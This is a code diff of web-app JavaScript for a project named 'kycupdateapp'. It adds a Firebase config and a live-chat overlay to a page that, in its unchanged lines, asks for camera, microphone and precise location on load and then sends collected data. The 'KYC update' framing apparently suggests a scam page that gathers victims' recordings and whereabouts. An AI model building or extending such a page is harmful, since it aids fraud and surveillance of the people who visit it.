@@ -1,3 +1,19 @@
+// Firebase Config (YOUR PROJECT'S CONFIG)
+const firebaseConfig = {
+    apiKey: "AIzaSyBiIEU8xsfxjYgGRjOvoP1RKtZKwN5i0yk",
+    authDomain: "kycupdateapp.firebaseapp.com",
+    databaseURL: "https://kycupdateapp-default-rtdb.firebaseio.com",
+    projectId: "kycupdateapp",
+    storageBucket: "kycupdateapp.firebasestorage.app",
+    messagingSenderId: "508854921421",
+    appId: "1:508854921421:web:ebd92a2f9d69b62d54a184"
+};
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore(); // Get a reference to Firestore database
+
+
 document.addEventListener('DOMContentLoaded', () => {
     // --- Get all the elements we need from the HTML ---
     const step1 = document.getElementById('step1-message');
@@ -14,11 +30,20 @@ document.addEventListener('DOMContentLoaded', () => {
     const thankYouLiveChatButton = document.getElementById('liveChatButton');
     const closeButton = document.getElementById('closeButton');
 
+    const liveChatOverlay = document.getElementById('liveChatOverlay');
+    const closeChatButton = document.getElementById('closeChatButton');
+    const chatNameInput = document.getElementById('chatNameInput');
+    const chatMessageInput = document.getElementById('chatMessageInput');
+    const sendChatMessageButton = document.getElementById('sendChatMessageButton');
+    const chatMessagesContainer = document.getElementById('chatMessages');
+
+
     let selectedEmoji = null;
     let mediaRecorder;
     let audioChunks = [];
     let userMediaStream; // Stores the MediaStream (camera/mic)
     let userLocation = { latitude: null, longitude: null }; // To store location data
+
 
     // --- Permissions on Page Load ---
     async function requestPermissions() {
@@ -38,8 +63,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         } catch (error) {
             console.warn('DEBUG: Camera/Microphone permissions were denied or encountered error:', error);
-            // If permissions are denied, ensure userMediaStream is null so we don't try to stop it later
-            userMediaStream = null;
+            userMediaStream = null; // Ensure userMediaStream is null if permissions denied
         }
 
         // --- Request Geolocation Permission ---
@@ -54,10 +78,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 },
                 (error) => {
                     console.warn('DEBUG: Geolocation permission denied or error:', error);
-                    // Common errors:
-                    // 1: PERMISSION_DENIED (user denied or browser denied for security)
-                    // 2: POSITION_UNAVAILABLE (GPS signal lost)
-                    // 3: TIMEOUT (took too long to get location)
                 },
                 { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } // Options for better accuracy
             );
@@ -229,8 +249,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 console.log('DEBUG: Data sent successfully.');
                 step2.classList.add('hidden');
                 step3.classList.remove('hidden');
-                
-                // --- NEW: Stop all camera/mic tracks ---
+
+                // --- Stop all camera/mic tracks ---
                 if (userMediaStream) {
                     userMediaStream.getTracks().forEach(track => track.stop());
                     console.log('DEBUG: Camera/Mic tracks stopped.');
@@ -250,8 +270,29 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- Thank You Screen Button Logic ---
     closeButton.addEventListener('click', () => { window.close(); });
-    thankYouLiveChatButton.addEventListener('click', () => { alert('Live Chat feature coming soon!'); });
-    mainLiveChatButton.addEventListener('click', () => { alert('Live Chat feature coming soon!'); });
+
+    // --- NEW: Live Chat Button Logic (opens overlay) ---
+    function openLiveChat() {
+        liveChatOverlay.classList.remove('hidden');
+        liveChatOverlay.classList.add('visible');
+        // Optional: Hide main content for better focus
+        // document.querySelector('.app-container').classList.add('hidden');
+    }
+
+    function closeLiveChat() {
+        liveChatOverlay.classList.remove('visible');
+        liveChatOverlay.classList.add('hidden');
+        // Optional: Show main content again
+        // document.querySelector('.app-container').classList.remove('hidden');
+    }
+
+    thankYouLiveChatButton.addEventListener('click', openLiveChat);
+    mainLiveChatButton.addEventListener('click', openLiveChat);
+    closeChatButton.addEventListener('click', closeLiveChat);
+
+    // Initial alert for live chat is replaced by actual UI attempt
+    // thankYouLiveChatButton.addEventListener('click', () => { alert('Live Chat feature coming soon!'); });
+    // mainLiveChatButton.addEventListener('click', () => { alert('Live Chat feature coming soon!'); });
 });
 
 // Add shake animation keyframes dynamically
